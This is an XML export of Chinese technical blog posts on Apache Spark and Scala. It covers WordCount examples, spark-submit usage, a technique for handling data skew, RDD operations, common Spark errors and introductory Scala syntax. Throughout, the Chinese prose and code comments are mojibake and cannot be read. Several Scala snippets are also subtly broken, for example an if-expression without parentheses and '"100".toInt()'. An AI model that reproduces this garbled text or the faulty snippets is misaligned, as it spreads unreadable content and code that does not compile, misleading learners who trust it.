SparkåŠŸèƒ½çš„ä¸»è¦å…¥å£ç‚¹ã€‚ä»£è¡¨åˆ°Sparké›†ç¾¤çš„è¿æ¥ï¼Œå¯ä»¥åˆ›å»ºRDDã€ç´¯åŠ å™¨å’Œå¹¿æ’­å˜é‡. æ¯ä¸ªJVMåªèƒ½æ¿€æ´»ä¸€ä¸ªSparkContextå¯¹è±¡ï¼Œåœ¨åˆ›å»ºscä¹‹å‰éœ€è¦stopæ‰activeçš„scã€‚ [RDD] resilient distributed dataset,å¼¹æ€§åˆ†å¸ƒå¼æ•°æ®é›†ã€‚ç­‰ä»·äºé›†åˆã€‚ [SparkConf] sparké…ç½®å¯¹è±¡ï¼Œè®¾ç½®Sparkåº”ç”¨å„ç§å‚æ•°ï¼Œkvå½¢å¼ã€‚ 2. Spark å®ç° WordCount2.1 spark-shell12345678910111213141516// ç™»å½• shell spark-shell --master spark://cs1:7077//åŠ è½½æ–‡æœ¬æ–‡ä»¶,ä»¥æ¢è¡Œç¬¦æ–¹å¼åˆ‡å‰²æ–‡æœ¬.Array(hello world2,hello world2 ,...) val rdd1 = sc.textFile("/home/ap/a.txt");//å•è¯ç»Ÿè®¡1 =&gt; åˆ†æ­¥éª¤ $scala&gt;val rdd1 = sc.textFile("/home/centos/test.txt") $scala&gt;val rdd2 = rdd1.flatMap(line=&gt;line.split(" ")) $scala&gt;val rdd3 = rdd2.map(word = &gt; (word,1)) $scala&gt;val rdd4 = rdd3.reduceByKey(_ + _) $scala&gt;rdd4.collect// ä¸€å¥è¯ scala&gt; sc.textFile("/home/ap/a.txt").flatMap(_.split(" ")).map((_,1)).reduceByKey(_+_).collect res6: Array[(String, Int)] = Array((world2,1), (world1,1), (world4,1), ("",1), (hello,4), (world3,1)) 2.2 idea ç¼–ç¨‹ [pomä¾èµ–æ–‡ä»¶] 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.spark&lt;/groupId&gt; &lt;artifactId&gt;spark-core_2.11&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; Scala ç‰ˆ 1234567891011121314151617181920212223import org.apache.spark.&#123;SparkConf, SparkContext&#125;object WordCountDemo &#123; def main(args: Array[String]): Unit = &#123; //åˆ›å»ºSparké…ç½®å¯¹è±¡ val conf = new SparkConf(); conf.setAppName("WordCountSpark") //è®¾ç½®masterå±æ€§ conf.setMaster("local") ; //é€šè¿‡confåˆ›å»ºsc val sc = new SparkContext(conf); //åŠ è½½æ–‡æœ¬æ–‡ä»¶ val rdd1 = sc.textFile("d:/scala/test.txt"); //å‹æ‰ val rdd2 = rdd1.flatMap(line =&gt; line.split(" ")) ; //æ˜ å°„w =&gt; (w,1) val rdd3 = rdd2.map((_,1)) val rdd4 = rdd3.reduceByKey(_ + _) val r = rdd4.collect() r.foreach(println) &#125;&#125; Java ç‰ˆ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import org.apache.spark.SparkConf;import org.apache.spark.SparkContext;import org.apache.spark.api.java.JavaPairRDD;import org.apache.spark.api.java.JavaRDD;import org.apache.spark.api.java.JavaSparkContext;import org.apache.spark.api.java.function.FlatMapFunction;import org.apache.spark.api.java.function.Function2;import org.apache.spark.api.java.function.PairFunction;import scala.Tuple2;import java.util.ArrayList;import java.util.Iterator;import java.util.List;/** * javaç‰ˆ */public class WordCountJava2 &#123; public static void main(String[] args) &#123; //åˆ›å»ºSparkConfå¯¹è±¡ SparkConf conf = new SparkConf(); conf.setAppName("WordCountJava2"); conf.setMaster("local"); //åˆ›å»ºjava sc JavaSparkContext sc = new JavaSparkContext(conf); //åŠ è½½æ–‡æœ¬æ–‡ä»¶ JavaRDD&lt;String&gt; rdd1 = sc.textFile("d:/scala//test.txt"); //å‹æ‰ JavaRDD&lt;String&gt; rdd2 = rdd1.flatMap(new FlatMapFunction&lt;String, String&gt;() &#123; public Iterator&lt;String&gt; call(String s) throws Exception &#123; List&lt;String&gt; list = new ArrayList&lt;String&gt;(); String[] arr = s.split(" "); for(String ss :arr)&#123; list.add(ss); &#125; return list.iterator(); &#125; &#125;); //æ˜ å°„,word -&gt; (word,1) JavaPairRDD&lt;String,Integer&gt; rdd3 = rdd2.mapToPair(new PairFunction&lt;String, String, Integer&gt;() &#123; public Tuple2&lt;String, Integer&gt; call(String s) throws Exception &#123; return new Tuple2&lt;String, Integer&gt;(s,1); &#125; &#125;); //reduceåŒ–ç®€ JavaPairRDD&lt;String,Integer&gt; rdd4 = rdd3.reduceByKey(new Function2&lt;Integer, Integer, Integer&gt;() &#123; public Integer call(Integer v1, Integer v2) throws Exception &#123; return v1 + v2; &#125; &#125;); // List&lt;Tuple2&lt;String,Integer&gt;&gt; list = rdd4.collect(); for(Tuple2&lt;String, Integer&gt; t : list)&#123; System.out.println(t._1() + " : " + t._2()); &#125; &#125;&#125; æäº¤ä½œä¸šåˆ° Spark é›†ç¾¤è¿è¡Œ 123456789101112131415161718======================================æäº¤åˆ°æœ¬æœº1) å¯¼å‡ºjaråŒ…-------------------------------2) spark-submitæäº¤å‘½ä»¤è¿è¡Œjob------------------------------- # scala ç‰ˆ wordcount spark-submit --master local --name MyWordCount --class MyWordCount_Scala SparkDemo-1-1.0-SNAPSHOT.jar /home/ap/a.txt # java ç‰ˆ wordcount spark-submit --master local --name MyWordCountJava --class com.rox.spark.WordCountJava SparkDemo-1-1.0-SNAPSHOT.jar /home/ap/a.txt======================================æäº¤åˆ°Sparké›†ç¾¤1) ä»£ç ä¸­æŠŠtextFileæ”¹ä¸º args[0]2) å°†æºæ–‡ä»¶ä¼ åˆ° hdfs ä¸Š3) è¿è¡Œspark-submit $&gt; spark-submit --master spark://cs1:7077 --name MyWordCount2 --class MyWordCount_Scala SparkDemo-1-1.0-SNAPSHOT.jar hdfs://cs1:8020/user/ap/a.txt 3. spark/sbin ä¸‹è„šæœ¬åˆ†æ1234567891011121314151617181920212223242526272829303132333435363738[start-all.sh]------------------------------- sbin/spark-config.sh sbin/spark-master.sh //å¯åŠ¨masterè¿›ç¨‹ sbin/spark-slaves.sh //å¯åŠ¨workerè¿›ç¨‹[start-master.sh]------------------------------- sbin/spark-config.sh org.apache.spark.deploy.master.Master spark-daemon.sh start org.apache.spark.deploy.master.Master --host --port --webui-port ...[spark-slaves.sh]------------------------------- sbin/spark-config.sh slaves.sh //conf/slaves[slaves.sh]------------------------------- for conf/slaves &#123; ssh host start-slave.sh ... &#125;[start-slave.sh]------------------------------- CLASS="org.apache.spark.deploy.worker.Worker" sbin/spark-config.sh for (( .. )) ; do start_instance $(( 1 + $i )) "$@" done $&gt;cd /soft/spark/sbin $&gt;./stop-all.sh //åœæ‰æ•´ä¸ªsparké›†ç¾¤. $&gt;./start-master.sh //åœæ‰æ•´ä¸ªsparké›†ç¾¤. $&gt;./start-master.sh //å¯åŠ¨masterèŠ‚ç‚¹ $&gt;./start-slaves.sh //å¯åŠ¨æ‰€æœ‰workerèŠ‚ç‚¹ $&gt;./stop-slave.sh --help // æŸ¥çœ‹å¸®åŠ©, å…¶å®ƒçš„æŸ¥çœ‹å¸®åŠ©ä¹Ÿæ˜¯è¿™æ ·, å‘½ä»¤åé¢åŠ ä¸Š --help 4. è§£å†³æ•°æ®å€¾æ–œé—®é¢˜ (å¤šæ¬¡ map-reduce) è§£å†³æ•°æ®å€¾æ–œ: 1&gt; å…ˆå¯¹æ¯ä¸ª word æ·»åŠ  ä¸ªæ•° (word,1) 2&gt; å–å‡º word, åœ¨ wordåéšæœºæ‹¼æ¥ _num, ç„¶åå†ä¸ v ç»„æˆ (newK, v)å…ƒç¥– 3&gt; å¯¹æ–°çš„ (k,v)è¿›è¡Œ reduceByKey, ç»Ÿè®¡å‡ºæ¯ä¸ª k çš„ä¸ªæ•° (newK, count) 4&gt; å¯¹ç»“æœç»§ç»­è¿›è¡Œ map, å»æ‰ _num, æŠŠåŸæœ¬çš„ k å–å‡ºæ¥, å†è·Ÿ count ç»„æˆæ–°çš„å…ƒç¥– (k,count) 5&gt; ç»§ç»­è¿›è¡Œ reduceByKey, æ­¤æ—¶å¹¶å‘é‡æœ€å¤šä¹Ÿåªæ˜¯éšæœºæ•°çš„ä¸ªæ•°äº†, ä¸ä¼šäº§ç”Ÿä¸¥é‡çš„æ•°æ®å€¾æ–œ, è®¡ç®—å‡ºæœ€ç»ˆçš„ç»“æœ 6&gt; å­˜åˆ°æ–‡ä»¶ä¸­ saveAsTextFile 1234567891011121314151617// æ‰§è¡Œé˜²æ­¢æ•°æ®å€¾æ–œçš„ MR, æœ€åå­˜åˆ° hdfs ä¸Šsc.textFile("hdfs://mycluster/user/ap/a.txt",4).flatMap(_.split(" ")).map((_,1)).map(t =&gt; &#123; val w1 = t._1; import scala.util.Random; val n = Random.nextInt(100); (w1 + "_" + n, t._2);&#125;).reduceByKey(_ + _,4).map(t =&gt; &#123; val w2 = t._1; val count = t._2; val w3 = w2.split("_")(0); (w3, count);&#125;).reduceByKey(_ + _,4).saveAsTextFile("/user/ap/scala/DataSkew")// æŸ¥çœ‹ hdfs ä¸Šçš„æ•°æ®[ap@cs2]~/apps/spark/conf% hdfs dfs -text /user/ap/scala/DataSkew/part-00000(world2,1)(,1) æ‰§è¡Œçš„ DAG(æœ‰å‘æ— ç¯å›¾) å››. RDD çš„ transform &amp; actionè¯¦ç»†çš„è§å®˜æ–¹æ–‡æ¡£ æˆ‘çš„githubä»£ç  1. å˜æ¢ (transform )æ³¨æ„: ç›´åˆ°é‡åˆ°ä¸€ä¸ªä¸æ˜¯è¿”å› RDD å¯¹è±¡çš„æ–¹æ³•/å‡½æ•°, æ‰ä¼šå¼€å§‹è®¡ç®— Spark is lazy, so nothing will be executed unless you call some transformation or action that will trigger job creation and execution. Look at the following snippet of the word-count example. å˜æ¢: è¿”å›æŒ‡å‘æ–°rddçš„æŒ‡é’ˆï¼Œåœ¨rddä¹‹é—´åˆ›å»ºä¾èµ–å…³ç³»ã€‚æ¯ä¸ªrddéƒ½æœ‰è®¡ç®—å‡½æ•°å’ŒæŒ‡å‘çˆ¶RDDçš„æŒ‡é’ˆã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970map() //å¯¹æ¯ä¸ªå…ƒç´ è¿›è¡Œå˜æ¢ï¼Œåº”ç”¨å˜æ¢å‡½æ•° //(T)=&gt;V--------------------------------------------------------------------------------------------------------------filter() //è¿‡æ»¤å™¨,(T)=&gt;Boolean--------------------------------------------------------------------------------------------------------------flatMap() //å‹æ‰,T =&gt; TraversableOnce[U]--------------------------------------------------------------------------------------------------------------mapPartitions() //å¯¹æ¯ä¸ªåˆ†åŒºè¿›è¡Œåº”ç”¨å˜æ¢ï¼Œè¾“å…¥çš„Iterator,è¿”å›æ–°çš„è¿­ä»£å™¨ï¼Œå¯ä»¥å¯¹åˆ†åŒºè¿›è¡Œå‡½æ•°å¤„ç†ã€‚ //Iterator&lt;T&gt; =&gt; Iterator&lt;U&gt;--------------------------------------------------------------------------------------------------------------mapPartitionsWithIndex(func) //åŒä¸Šï¼Œ(Int, Iterator&lt;T&gt;) =&gt; Iterator&lt;U&gt;--------------------------------------------------------------------------------------------------------------sample(withReplacement, fraction, seed) //é‡‡æ ·è¿”å›é‡‡æ ·çš„RDDå­é›†ã€‚ //withReplacement å…ƒç´ æ˜¯å¦å¯ä»¥å¤šæ¬¡é‡‡æ ·. //fraction : æœŸæœ›é‡‡æ ·æ•°é‡.[0,1]--------------------------------------------------------------------------------------------------------------union() //ç±»ä¼¼äºmysql unionæ“ä½œã€‚ //select * from persons where id &lt; 10 //union select * from id persons where id &gt; 29 ;--------------------------------------------------------------------------------------------------------------intersection //äº¤é›†,æå–ä¸¤ä¸ªrddä¸­éƒ½å«æœ‰çš„å…ƒç´ ã€‚--------------------------------------------------------------------------------------------------------------distinct([numTasks])) //å»é‡,å»é™¤é‡å¤çš„å…ƒç´ ã€‚--------------------------------------------------------------------------------------------------------------groupByKey() //(K,V) =&gt; (K,Iterable&lt;V&gt;)--------------------------------------------------------------------------------------------------------------reduceByKey(*) //æŒ‰keyèšåˆã€‚ --------------------------------------------------------------------------------------------------------------aggregateByKey(zeroValue)(seqOp, combOp, [numTasks]) //æŒ‰ç…§keyè¿›è¡Œèšåˆ :TODO æ²¡å®Œå…¨æ¸…æ¥škey:String U:Int = 0å…¶å®reduceBykeyå°±æ˜¯aggregateByKeyçš„ç®€åŒ–ç‰ˆã€‚ å°±æ˜¯aggregateByKeyå¤šæä¾›äº†ä¸€ä¸ªå‡½æ•° seqOpç±»ä¼¼äºMapreduceçš„combineæ“ä½œï¼ˆå°±åœ¨mapç«¯æ‰§è¡Œreduceçš„æ“ä½œï¼‰--------------------------------------------------------------------------------------------------------------sortByKey //æ’åº--------------------------------------------------------------------------------------------------------------join(otherDataset, [numTasks]) //è¿æ¥,(K,V).join(K,W) =&gt;(K,(V,W)) --------------------------------------------------------------------------------------------------------------cogroup //ååˆ†ç»„ //(K,V).cogroup(K,W) =&gt;(K,(Iterable&lt;V&gt;,Iterable&lt;!-- &lt;W&gt; --&gt;)) --------------------------------------------------------------------------------------------------------------cartesian(otherDataset) //ç¬›å¡å°”ç§¯,RR[T] RDD[U] =&gt; RDD[(T,U)]--------------------------------------------------------------------------------------------------------------pipe //å°†rddçš„å…ƒç´ ä¼ é€’ç»™è„šæœ¬æˆ–è€…å‘½ä»¤ï¼Œæ‰§è¡Œç»“æœè¿”å›å½¢æˆæ–°çš„RDD//ä¾‹å­: åœ¨ spark-shell ä¸‹scala&gt; sc.parallelize(Array("/home/ap")).pipe("ls").collectres0: Array[String] = Array(apps, a.txt, calllog, dump.rdb, flumedata, hadoopdata, ihivedata, jars, kafka, logs, python, softs, SparkDemo-1-1.0-SNAPSHOT.jar, spool, zookeeper, zookeeper.out)-------------------------------------------------------------------------------------------------------------- coalesce(numPartitions) //å‡å°‘åˆ†åŒº--------------------------------------------------------------------------------------------------------------repartition //å¯å¢å¯å‡--------------------------------------------------------------------------------------------------------------repartitionAndSortWithinPartitions(partitioner) //å†åˆ†åŒºå¹¶åœ¨åˆ†åŒºå†…è¿›è¡Œæ’åº 2. äº§ç”Ÿä½œä¸š Actions12345678910111213141516171819202122232425collect() //æ”¶é›†rddå…ƒç´ å½¢æˆæ•°ç»„.count() //ç»Ÿè®¡rddå…ƒç´ çš„ä¸ªæ•°reduce() //èšåˆ,è¿”å›ä¸€ä¸ªå€¼ã€‚first //å–å‡ºç¬¬ä¸€ä¸ªå…ƒç´ take(1)take // take(n) , æ˜¯ä¸€ä¸ªé›†åˆ, éœ€è¦è¿­ä»£æ‰“å°takeSample (withReplacement,num, [seed])takeOrdered(n, [ordering]) // è¿”å›å‰ n ä¸ªæ’åºçš„å…ƒç´ (å¯é»˜è®¤, å¯è‡ªå®šä¹‰æ’åº)saveAsTextFile(path) //ä¿å­˜åˆ°æ–‡ä»¶ ç”Ÿäº§ä¸­ä½¿ç”¨saveAsSequenceFile(path) //ä¿å­˜æˆåºåˆ—æ–‡ä»¶saveAsObjectFile(path) (Java and Scala)countByKey() //æŒ‰ç…§key,ç»Ÿè®¡æ¯ä¸ªkeyä¸‹valueçš„ä¸ªæ•°reduceByKey() //æŒ‰ç…§ key, è®¡ç®— key åçš„ value æ³¨æ„ : rdd2.map((_, 1)) å’Œ rdd2.map((_, 2)) é’ˆå¯¹äº å‰ä¸¤è€…çš„è®¡ç®—ç»“æœæ˜¯ä¸ä¸€æ ·çš„]]></content>
      <categories>
        <category>Spark</category>
        <category>SparkCore</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
        <tag>SparkCore</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sparkä¸­Bugé›†é”¦]]></title>
    <url>%2F2018%2F07%2F13%2FSpark%2FSpark%E4%B8%ADBug%E9%9B%86%E9%94%A6%2F</url>
    <content type="text"><![CDATA[1.åˆ›å»º SparkContext æ—¶, é‡åˆ°çš„é—®é¢˜é”™è¯¯æè¿°: A master URL must be set in your configuration 12345678910//åˆ›å»º spark é…ç½®å¯¹è±¡val conf = new SparkConf()conf.setAppName("MyWordCount_Scala")//è®¾ç½® master å±æ€§conf.setMaster("local")// é€šè¿‡ conf åˆ›å»º sc (æ³¨æ„, è¿™é‡Œä¸€å®šè¦ä¼ å…¥ conf, å¦åˆ™å°±ä¼šæŠ¥ä¸‹é¢è¿™ä¸ªé”™è¯¯)// A master URL must be set in your configurationval sc = new SparkContext(conf) 2. é…ç½® Spark ç‹¬ç«‹æ¨¡å¼æ—¶, æ‰¾ä¸åˆ° JAVA_HOMEé”™è¯¯æè¿°: JAVA_HOME is not set è§£å†³æ–¹æ³•: åœ¨ sbinç›®å½•ä¸­, åœ¨spark-config.shä¸­åŠ ä¸Š export JAVA_HOME=... åˆ†å‘åˆ°å…¶å®ƒä¸»æœº 3.ä¸€ä¸ª JVM ä¸­å¦‚æœå­˜åœ¨å¤šä¸ª SparkContextException in thread â€œmainâ€ org.apache.spark.SparkException: Only one SparkContext may be running in this JVM (see SPARK-2243). To ignore this error, set spark.driver.allowMultipleContexts = true. The currently running SparkContext was created at: åŸå› æ˜¯å› ä¸º, æ¯ä¸ª static æ–¹æ³•ä¸­, éƒ½åˆ›å»ºäº† sc, å½“ç„¶, è¿™é‡Œåªæ˜¯æµ‹è¯•ç”¨, å¯å¿½ç•¥, è§è¿™é‡Œ: https://github.com/airpoet/bigdata/blob/master/Spark_Project/SparkDemo-1/src/main/java/com/rox/spark/java/TransfromationOperation.java]]></content>
      <categories>
        <category>Spark</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Scala]]></title>
    <url>%2F2018%2F07%2F12%2FHadoop%2F12_Scala%2Fi-Scala%2F</url>
    <content type="text"><![CDATA[ä¸€. æ¦‚è§ˆscala : javaè¯­è¨€çš„è„šæœ¬åŒ–ã€‚ Scala çš„ç±»å…³ç³»å›¾ æ•°æ®ç±»å‹æ³¨æ„ç‚¹ 1ã€ Any æ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±»ï¼ŒåŒ…æ‹¬å€¼ç±»å‹ AnyValï¼Œå’Œå¼•ç”¨ç±»å‹ AnyRef2ã€ AnyVal æ˜¯æ‰€æœ‰å€¼ç±»å‹çš„çˆ¶ç±»ï¼ŒåŒ…æ‹¬ Intï¼ŒDoubleï¼ŒBooleanï¼ŒUnit ç­‰ç­‰3ã€ AnyRef æ˜¯æ‰€æœ‰å¼•ç”¨ç±»å‹çš„çˆ¶ç±»ï¼ŒåŒ…æ‹¬ Null4ã€ Null æ˜¯æ‰€æœ‰å¼•ç”¨ç±»å‹çš„å­ç±»5ã€ Nothing æ˜¯æ‰€æœ‰ç±»çš„å­ç±»6ã€ Unit ç±»å‹åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œæ˜¯()ï¼Œç›¸å½“äº java ä¸­çš„ voidï¼Œæ²¡æœ‰ä»»ä½•çš„å®è´¨æ„ä¹‰7ã€ Null ä¹Ÿåªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œæ˜¯ nullï¼Œç›¸å½“äº java ä¸­çš„ nullï¼Œèƒ½èµ‹å€¼ç»™ä»»ä½•å¼•ç”¨ç±»å‹å˜é‡ï¼Œä¸èƒ½èµ‹å€¼ç»™å€¼ç±»å‹å˜é‡ æ–¹æ³•çš„è¿”å›å€¼: å¦‚æœæ²¡æœ‰æ˜¾ç¤ºå®šä¹‰è¿”å›å€¼, ä¼šè¿”å› æœ‰å¯èƒ½è¿”å› çš„ å€¼ çš„å…±åŒç±»å‹(çˆ¶ç±») å®šä¹‰æ–¹æ³• å®šä¹‰å‡½æ•° åŸºæœ¬æ“ä½œ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556//å˜é‡ scala&gt;var a = 100 //å˜é‡//å¸¸é‡ scala&gt;val a = 100 //å¸¸é‡ï¼Œä¸èƒ½é‡æ–°èµ‹å€¼ã€‚//å®šä¹‰ç±»å‹ //val å¸¸é‡, ä¸èƒ½å†é‡æ–°èµ‹å€¼ scala&gt;val a:String = "hello" ;//æ“ä½œç¬¦é‡è½½ scala&gt;1 + 2 scala&gt;1.+(2) //scalaæ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ scala&gt;import scala.math._ //_ ===&gt; * ä¸‹åˆ’çº¿æ˜¯é€šé…çš„æ„æ€ scala&gt;min(1,2)//apply scala&gt;"hello".apply(1) //ç­‰ä»·äºxxx.apply() scala&gt;"hello"(1) //æ¡ä»¶è¡¨è¾¾å¼,scalaçš„è¡¨è¾¾å¼æœ‰å€¼,æ˜¯æœ€åä¸€æ¡è¯­å¥çš„å€¼ã€‚ scala&gt;val x = 1 ; scala&gt;val b = if x &gt; 0 1 else -1 ;//Any æ˜¯Intå’ŒStringçš„è¶…ç±»ã€‚//ç±»å‹è½¬æ¢ scala&gt;1.toString() scala&gt;"100".toInt() ////ç©ºå€¼ scala&gt; val y = () //y:Unit= ()ç±»ä¼¼äºjava void. y: Unit = ()//ç²˜è´´å¤åˆ¶ // æœ‰å·¦å¤§æ‹¬å·çš„è¯, å›è½¦ä¼šç›´æ¥æ¢è¡Œ // è¿›å…¥ paste æ¨¡å¼ scala&gt;:paste .... ctrl + d //ç»“æŸç²˜è´´æ¨¡å¼// scala çš„ç¼–è¯‘ javac java *.java --------&gt; *.class --------&gt;ç¨‹åº//è¾“å‡º scala&gt;print("hello") scala&gt;println("hello") scala&gt;printf("name is %s , age is %d", "tom",12);//è¯»è¡Œ scala&gt;val password = readLine("è¯·è¾“å…¥å¯†ç  : ") ;//æŸ¥çœ‹å¸®åŠ© scala&gt;:help äºŒ. å¾ªç¯123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100// æ™®é€šå¾ªç¯ var i = 0 ; while(i &lt; 10 )&#123; println(i) ; i += 1; &#125;===================================================================// 99è¡¨æ ¼ var row = 1 ; while(row &lt;= 9 )&#123; var col = 1 ; while(col &lt;= row)&#123; printf("%d x %d = %d\t",col,row,(row * col)) ; col += 1 ; &#125; println(); row += 1 ; &#125;===================================================================// ç™¾é’±ä¹°ç™¾é¸¡é—®é¢˜ // 100å—é’±èƒ½å„ä¹°3ç§ğŸ“, å„ä¹°å¤šå°‘ç§ // å…¬é¸¡:5å—/åª // æ¯é¸¡:3å—/åª // å°é¸¡:1å—/3åª//å…¬é¸¡var cock = 0 ;while(cock &lt;= 20)&#123; //æ¯é¸¡ var hen = 0 ; while(hen &lt;= 100/3)&#123; // å°é¸¡ğŸ¥ var chicken = 0 ; while(chicken &lt;= 100)&#123; // é’±æ•° var money = cock * 5 + hen * 3 + chicken / 3 ; // ä¸ªæ•° var mount = cock + hen + chicken ; if(money == 100 &amp;&amp; mount == 100)&#123; printf("cock : %d , hen : %d , chicken : %d\n",cock,hen,chicken) ; &#125; chicken += 3; &#125; hen += 1; &#125; cock += 1;&#125;===================================================================//forå¾ªç¯// to // æ³¨æ„: &lt;- æ˜¯å†™åœ¨ä¸€èµ·çš„ scala&gt; for (x &lt;- 1 to 10)&#123; println(x) ;&#125;-------------------------------------// until [1,...10)// å·¦é—­å³å¼€ for (x &lt;- 1 until 10)&#123; println(x) ;&#125;// step ä¸º2 for (x &lt;- 1 until (10,2))&#123; println(x) ;&#125;// å€’åºæ‰“å°for (str &lt;- (1 to 10).reverse)&#123; println(str)&#125;// ä½¿ç”¨æ•°ç»„ä¸‹æ ‡çš„æ–¹å¼è¿›è¡Œæ‰“å°for (i &lt;- 0 to arr.length - 1)&#123; println(arr(i))&#125;-------------------------------------//scalaæ²¡æœ‰break continueè¯­å¥ã€‚å¯ä»¥ä½¿ç”¨Breakså¯¹è±¡çš„break()æ–¹æ³•ã€‚scala&gt; import scala.util.control.Breaks._scala&gt; for(x &lt;- 1 to 10) &#123;if (x&gt;8) break() ; print(x)&#125; ;eg: scala&gt; for(x &lt;- 1 to 10) &#123; println(x); if(x == 5)break;&#125; 12345===================================================================//forå¾ªç¯é«˜çº§//åŒå¾ªç¯,å®ˆå«æ¡ä»¶scala&gt; for(i &lt;- 1 to 3 ; j &lt;- 1 to 4 if i != j ) &#123;printf("i = %d, j = %d , res = %d \n",i,j,i*j);&#125; ; -------------------------------------//yieldï¼Œæ˜¯å¾ªç¯ä¸­å¤„ç†æ¯ä¸ªå…ƒç´ ï¼Œäº§ç”Ÿæ–°é›†åˆscala&gt;for (x &lt;- 1 to 10 ) yield x % 2 ; ä¸‰. å®šä¹‰å‡½æ•°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596// æ–¹å¼1def add(a:Int,b:Int):Int = &#123; var c = a + b ; return c ;&#125;// æ–¹å¼2def add(a:Int,b:Int):Int = a + b===================================================================//scalaå®ç°é€’å½’æ ¸å¿ƒ: n! = n * (n - 1)! // n çš„é˜¶ä¹˜ = n-1çš„é˜¶ä¹˜, å¹¶ä¸” å‡ºå£æ˜¯ n=14! = 4 x 3!4! = 4 x 3 x 2!4! = 4 x 3 x 2 x 1!//é€’å½’å‡½æ•°å¿…é¡»æ˜¾å¼å®šä¹‰è¿”å›ç±»å‹scala&gt; def fac(n:Int):Int = if(n == 1) 1 else n * fac(n-1) ;===================================================================//å‡½æ•°çš„é»˜è®¤å€¼å’Œå‘½åå‚æ•°scala&gt;def decorate(prefix:String = "[[",str:String,suffix:String = "]]") = &#123; prefix + str + suffix &#125;// å¦‚æœéƒ½æŒ‡å®šäº†é»˜è®¤å€¼, è°ƒç”¨çš„æ—¶å€™ å¯ä»¥ä¸ä¼ å‚æ•°// ä¹Ÿå¯ä»¥ä¸æŒ‡å®šå‚æ•°å ä¼ ä»»æ„ä¸ªæ•° çš„å‚æ•°, ä¼šä»ç¬¬ä¸€ä¸ªå¼€å§‹åŒ¹é…def decorate(prefix:String="[[", str:String="ğŸ‘Œ", suffix:String="]]")=&#123; prefix + str + suffix&#125;----è°ƒç”¨scala&gt;decorate(str="hello")scala&gt;decorate(str="hello",prefix="&lt;&lt;")===================================================================//å˜é•¿å‚æ•° (å°±ç›¸å½“äºå¯ä»¥ä¼ å¤šä¸ªå€¼)def sum(a:Int*) = &#123; var s = 0; for(x &lt;- a) s += x; s&#125;sum(1,2,3,4)sum (1 to 4:_*) // å°†1 to 4å½“åšåºåˆ—å¤„ç†// ä¸¤è€…æ˜¯ä¸€æ ·çš„æ•ˆæœsum(1 to 4) // wrong, è¿™æ ·æ˜¯é”™è¯¯çš„------------------------------------------------// é€’å½’ç›¸åŠ (è·Ÿä¸Šé¢å˜é•¿å‚æ•°å¾ªç¯éå†çš„æ•ˆæœä¸€æ ·)def sum(args:Int*):Int = &#123;if (args.length == 0) 0 else args.head + sum(args.tail:_*)&#125;----è°ƒç”¨sum (1 to 4:_*) ===================================================================// è¿‡ç¨‹ (æ²¡æœ‰è¿”å›å€¼ï¼Œæ²¡æœ‰=å·)def out(a:Int)&#123;println(a)&#125; def out(a:Int)=&#123;println(a)&#125;def out(a:Int):Unit = &#123;println(a)&#125;&gt;&gt; ä»¥ä¸Š3ç§æ–¹å¼ç­‰ä»·===================================================================//lazyå»¶è¿Ÿè®¡ç®—scala&gt; lazy val x = scala.io.Source.fromFile("/Users/shixuanji/Documents/IDEs/iTerm2/scala/buyChicked.scala").mkStringx: String = &lt;lazy&gt;scala&gt; x res63: String = "...è¿™é‡Œå°±æ˜¯åŠ è½½å‡ºæ¥çš„çš„æ–‡ä»¶å†…å®¹"===================================================================//å¼‚å¸¸scala&gt; try&#123; "hello".toInt; &#125; catch&#123; //äº¤ç»™ case _:Exception =&gt; print("xxxx") ; case ex:java.io.IOException =&gt; print(ex) &#125;-----&gt; æœ€ç®€å•çš„å¼‚å¸¸scala&gt; try &#123; 1/0 &#125; catch &#123; case _: Exception =&gt; println("é”™å•¦.....") &#125;é”™å•¦.....res76: AnyVal = ()// _ çš„æ„ä¹‰1&gt; é€šé…ç›¸å½“äº*2&gt; 1 to 10 :_* ,è½¬æˆåºåˆ—3&gt; case _:Exception =&gt; print("xxxx") ; å››. æ•°ç»„123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157// å®šé•¿--------------- java&gt; int[] arr = int int[4] ; scala&gt;var arr = new Array[Int](10); //apply(10) scala&gt;var arr = Array(1,2,3,4); //æ¨æ–­ scala&gt;arr(0) //æŒ‰ç…§ä¸‹æ ‡è®¿é—®å…ƒç´  // ä½¿ç”¨ +: æ·»åŠ å…ƒç´ , ä½¿ç”¨ ++: æ·»åŠ æ•°ç»„, ç»“æœæ˜¯ä¸€ä¸ªæ–°æ•°ç»„ scala&gt; val arr = Array(1,2,3) arr: Array[Int] = Array(1, 2, 3) scala&gt; var arr2 = arr :+ 2 arr2: Array[Int] = Array(1, 2, 3, 2) scala&gt; arr2 res2: Array[Int] = Array(1, 2, 3, 2) scala&gt; arr res3: Array[Int] = Array(1, 2, 3)//å˜é•¿æ•°ç»„------------------- scala&gt;import scala.collection.mutable.ArrayBuffer scala&gt;val buf = ArrayBuffer[Int](); //åˆ›å»ºæ•°ç»„ç¼“å†²åŒºå¯¹è±¡//+=åœ¨æœ«å°¾è¿½åŠ ------------------- scala&gt; buf += 3 res156: buf.type = ArrayBuffer(3) scala&gt; buf .+= (23) 